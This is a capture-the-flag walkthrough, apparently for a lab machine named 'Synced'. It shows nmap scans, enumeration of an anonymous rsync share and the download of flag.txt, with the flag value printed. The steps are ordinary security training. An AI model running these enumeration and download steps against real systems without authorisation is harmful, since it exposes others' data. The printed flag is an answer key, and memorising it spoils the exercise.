# Synced

TARGET MACHINE IP ADDRESS
10.129.228.37

----
## Nmap

### Initial
```
nmap -Pn 10.129.228.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 12:22 EST
Nmap scan report for 10.129.228.37
Host is up (0.048s latency).
Not shown: 999 closed tcp ports (reset)
PORT    STATE SERVICE
873/tcp open  rsync

Nmap done: 1 IP address (1 host up) scanned in 0.88 second
```

### Detailed
```
nmap -Pn -sS -sV -sC -O -T4 -p 873 10.129.228.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 12:22 EST
Nmap scan report for 10.129.228.37
Host is up (0.039s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 
Device type: general purpose|WAP|webcam|broadband router
Running (JUST GUESSING): Linux 2.6.X|2.4.X (92%), Asus embedded (92%), AXIS embedded (92%)%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n10 cpe:/h:axis:211_network_camera cpl:2.6.20 cpe:/h:linksys:wrv54g cpe:/h:asus:rt-ac66u cpe:/o:linux:linux_kernel:2.4 cpe:/o:l18
Aggressive OS guesses: Asus RT-N10 router or AXIS 211A Network Camera (Linux 2.6) (92%), LS 211A Network Camera (Linux 2.6.20) (92%), Linux 2.6.16 (91%), AXIS 210A or 211 Network C90%), Linksys WRV54G WAP (89%), Asus RT-AC66U router (Linux 2.6) (89%), Asus RT-N16 WAP (LRT-N66U WAP (Linux 2.6) (89%), Tomato 1.28 (Linux 2.6.22) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.or
Nmap done: 1 IP address (1 host up) scanned in 16.69 seconds
```

----
## rsync
- [Resource](https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-1-rsync/)

### Enumerate rsync Shares

```
rsync 10.129.228.37::
public          Anonymous Share
# |--> share    |--> description
```
- If rsync returns with the available directories and files without asking for authentication, it means that the service allows anonymous unauthenticated access.

### Enumerate Share Contents

```
rsync 10.129.228.37::public
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt

# or: 

rsync -av --list-only rsync://10.129.228.37/public
receiving incremental file list
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt

sent 24 bytes  received 74 bytes  6.32 bytes/sec
total size is 33  speedup is 0.34
```

## Pwn: Download Files via rsync

```
rsync 10.129.228.37::public/flag.txt .

cat flag.txt 
72eaf5344ebb84908ae543a719830519
```
![Pasted image 20240221120005](https://github.com/GregKedrovsky/Hacking/assets/26492233/f2b995b0-1c8e-49e5-82e2-0568420d8004)
